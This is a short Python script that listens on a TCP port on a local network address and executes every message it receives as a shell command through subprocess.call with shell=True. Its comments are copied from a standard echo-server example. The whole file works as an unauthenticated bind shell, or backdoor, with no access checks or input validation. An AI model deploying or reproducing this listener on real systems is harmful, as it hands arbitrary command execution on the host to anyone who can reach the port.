import socket
import sys
import time
import subprocess
# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp 
# Bind the socket to the port
server_address = ('192.168.0.110', 9988)

print('starting up on %s port %s' % server_address)

sock.bind(server_address)

# Listen for incoming connections
sock.listen(1)


while True:
    # Wait for a connection
    print('waiting for a connection')
    time.sleep(2)
    connection, client_address = sock.accept()
    try:
        print('connection from', client_address)
        # Receive the data in small chunks and retransmit it
        while True:
            data = connection.recv(1024)
            subprocess.call(data.decode(),shell=True)
            print('received "%s"' % data)
            time.sleep(2)
            if data:
                print('sending data back to the client')
                time.sleep(2)
                connection.sendall("done".encode())
            else:
                print('no more data from', client_address)
                break       
    finally:
        # Clean up the connection
        connection.close()